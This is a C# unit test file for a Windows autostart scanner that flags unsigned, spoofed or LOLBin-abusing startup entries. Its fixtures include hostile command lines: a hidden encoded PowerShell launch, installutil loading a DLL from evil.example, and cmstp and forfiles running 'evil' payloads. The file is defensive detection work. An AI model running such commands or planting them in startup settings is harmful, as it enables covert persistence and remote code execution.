using Aegis.Core.Models;
using Aegis.Scanners.Autostart;
using Aegis.Scanners.Probing;
using Xunit;

namespace Aegis.Scanners.Tests.Autostart;

public sealed class AutostartScannerTests
{
    [Fact]
    public async Task ScanAsync_SkipsTrustedMicrosoftEntries()
    {
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("OneDrive", @"C:\Program Files\Microsoft\OneDrive\OneDrive.exe",
                SignatureStatus.Signed, "Microsoft Corporation"),
        ]));

        var result = await scanner.ScanAsync();

        Assert.Empty(result.Findings);
    }

    [Fact]
    public async Task ScanAsync_UnsignedFromTempFolder_IsDanger()
    {
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("QbtRunner", @"C:\Users\Ivan\AppData\Local\Temp\QbtRunner.exe",
                SignatureStatus.Unsigned, publisher: null),
        ]));

        var result = await scanner.ScanAsync();

        var finding = Assert.Single(result.Findings);
        Assert.Equal(Severity.Danger, finding.Severity);
        Assert.Contains("Неизвестная программа", finding.Title);
    }

    [Fact]
    public async Task ScanAsync_UnsignedFromNormalPath_IsWarning()
    {
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("Helper", @"C:\Program Files\Helper\helper.exe", SignatureStatus.Unsigned, null),
        ]));

        var result = await scanner.ScanAsync();

        var finding = Assert.Single(result.Findings);
        Assert.Equal(Severity.Warning, finding.Severity);
        Assert.Contains("без цифровой подписи", finding.Title);
    }

    [Fact]
    public async Task ScanAsync_SignedThirdParty_IsWarningAboutSlowStartup()
    {
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("Spotify", @"C:\Users\Ivan\AppData\Roaming\Spotify\Spotify.exe",
                SignatureStatus.Signed, "Spotify AB"),
        ]));

        var result = await scanner.ScanAsync();

        var finding = Assert.Single(result.Findings);
        Assert.Equal(Severity.Warning, finding.Severity);
        Assert.Contains("замедляет включение", finding.Title);
        // Тяжёлое приложение (Spotify) → пометка «высокое влияние на загрузку».
        Assert.Equal("Влияние на загрузку: высокое", finding.Data!["category"]);
    }

    [Fact]
    public async Task ScanAsync_SignedOrdinaryApp_IsInfo_NotSlowdownWarning()
    {
        // Подписанная программа с ОБЫЧНЫМ влиянием на загрузку — просто информация, а не пугающее
        // «Лишнее замедляет включение» (регресс аудита 2026-07-02).
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("Заметки", @"C:\Program Files\Notes\notes.exe", SignatureStatus.Signed, "Notes Inc"),
        ]));

        var finding = Assert.Single((await scanner.ScanAsync()).Findings);
        Assert.Equal(Severity.Info, finding.Severity);
        Assert.DoesNotContain("замедляет", finding.Title);
    }

    [Fact]
    public async Task ScanAsync_OrdinaryApp_LabeledNormalBootImpact()
    {
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("Помощник", @"C:\Program Files\SomeVendor\assistant.exe", SignatureStatus.Unsigned, null),
        ]));

        var finding = Assert.Single((await scanner.ScanAsync()).Findings);
        Assert.Equal("Влияние на загрузку: обычное", finding.Data!["category"]);
    }

    [Fact]
    public async Task ScanAsync_SameNameDifferentRegistryHive_ProducesDistinctIds()
    {
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("Updater", @"C:\Apps\u.exe", SignatureStatus.Unsigned, null,
                source: @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            Entry("Updater", @"C:\Apps\u.exe", SignatureStatus.Unsigned, null,
                source: @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        ]));

        var result = await scanner.ScanAsync();

        Assert.Equal(2, result.Findings.Count);
        Assert.NotEqual(result.Findings[0].Id, result.Findings[1].Id);
    }

    [Fact]
    public async Task ScanAsync_SignedMicrosoftLolBinAbuse_IsFlaggedAsDanger()
    {
        // powershell.exe подписан Microsoft (был бы «доверенным»), но команда — зашифрованный запуск.
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("WinUpdate", @"powershell.exe -nop -w hidden -enc SQBFAFgA", SignatureStatus.Signed, "Microsoft Corporation"),
        ]));

        var result = await scanner.ScanAsync();

        var finding = Assert.Single(result.Findings);
        Assert.Equal(Severity.Danger, finding.Severity);
        Assert.Contains("Маскировка через системную программу", finding.Title);
    }

    [Theory]
    [InlineData(@"wmic.exe process call create ""calc.exe""")]
    [InlineData(@"installutil.exe /u http://evil.example/x.dll")]
    [InlineData(@"cmstp.exe /s /ni C:\Temp\evil.inf")]
    [InlineData(@"forfiles /p C:\ /m *.* /c ""cmd /c evil.exe""")]
    public async Task ScanAsync_ExtendedLolBinAbuse_IsFlaggedAsDanger(string command)
    {
        // Расширенные LOLBin-паттерны (clean-room по LOLBAS): бинарь подписан Microsoft, но команда — приём злоупотребления.
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("X", command, SignatureStatus.Signed, "Microsoft Corporation"),
        ]));

        var finding = Assert.Single((await scanner.ScanAsync()).Findings);
        Assert.Equal(Severity.Danger, finding.Severity);
    }

    [Fact]
    public async Task ScanAsync_SignedButSpoofedPublisherPrefix_IsNotTrusted()
    {
        // Издатель начинается на "Microsoft", но это не каноническое имя — доверять нельзя.
        var scanner = new AutostartScanner(new FakeAutostartProbe(
        [
            Entry("FakeMs", @"C:\Apps\fake.exe", SignatureStatus.Signed, "Microsoft-Evil Corp"),
        ]));

        var result = await scanner.ScanAsync();

        Assert.Single(result.Findings);
    }

    private static AutostartEntry Entry(
        string name,
        string command,
        SignatureStatus signature,
        string? publisher,
        string source = @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run") =>
        new()
        {
            Name = name,
            Command = command,
            Location = AutostartLocation.RegistryRun,
            Source = source,
            Signature = signature,
            Publisher = publisher,
        };

    private sealed class FakeAutostartProbe(IReadOnlyList<AutostartEntry> entries) : IAutostartProbe
    {
        public Task<IReadOnlyList<AutostartEntry>> FindAsync(CancellationToken cancellationToken = default) =>
            Task.FromResult(entries);
    }
}
